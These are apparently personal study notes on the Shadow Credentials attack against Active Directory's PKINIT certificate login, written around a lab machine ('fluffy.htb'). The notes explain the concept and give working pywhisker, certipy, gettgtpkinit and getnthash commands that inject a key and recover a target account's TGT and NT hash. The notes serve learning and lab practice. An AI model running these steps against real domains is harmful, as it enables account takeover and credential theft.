#lateral_movement #PrivEsc 

PKINIT = an extension to Kerberos
PKINIT = **Kerberos login using certificates instead of passwords**.
Instead of password-derived keys, the client authenticates with a **certificate + private key**.

>PKINIT is a asymmetric key (public key) approach. The client has a public-private key pair, and encrypts the pre-authentication data with their private key, and the KDC decrypts it with the client’s public key. The KDC also has a public-private key pair, allowing for the exchange of a session key

---
A **Shadow Credential** attack abuses PKINIT.
In AD, every account that can do **Kerberos authentication with certificates** has a `msDS-KeyCredentialLink` attribute.

If an attacker can write to this attribute (via misconfigured ACLs / GenericWrite / GenericAll rights), they can add their own **malicious key pair**, Then they can generate a fake certificate corresponding to their private key.
Using PKINIT, they authenticate as that user (even a Domain Admin) **without knowing their password or NT hash**.

## attack flow:
1. User requests a TGT with their certificate (AS-REQ with PA-PK-AS-REQ). (AFTER INJECTING THE `msDS-KeyCredentialLink` )
2. KDC Looks at the target account’s `msDS-KeyCredentialLink` and finds the public key you injected and uses it to **verify your signature** (not decrypt anything with a password key).
3. If valid, DC issues a TGT **without needing the password**. (proof you own the private key)
![[Pasted image 20250902192859.png]]
---
# Exploitation

basically it allow us to modify the `msDS-KeyCredentialLink` to add our forged private,public key pair and outputs a certificate
```bash
pywhisker.py -d "<DOMAIN>" -u "<USER>" -p "<PASSWORD>" --target "winrm_svc" --action "add"

# This adds your malicious public key to the user’s msDS-KeyCredentialLink and You now have a private key + certificate that AD trusts for that user.

```


then we need to get TGT with the outputted certs:
```bash
gettgtpkinit.py -cert-pfx $CERT.PFX -pfx-pass $PASS fluffy.htb/winrm_svc winrm_svc.ccache


# can be done with certipy too:

certipy auth -pfx TCnbNbni.pfx -password 'ZUlqKYkrWtrdRqPZqkMl' -username winrm_svc -domain fluffy.htb -dc-ip 10.10.11.69
```
this command will get us AS-REP encryption key. This is the **user's NT hash** derived from the AS-REP response.

export the ccache:
```bash
export KRB5CCNAME=winrm_svc.ccache
```


then last thing to get the NT hash:
```bash
python3 getnthash.py -key 159bb5340c836973dd34c732c9f1efe0e6a98771ef00bdf0918d514b55d405ee fluffy.htb/winrm_svc

```


[ref](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)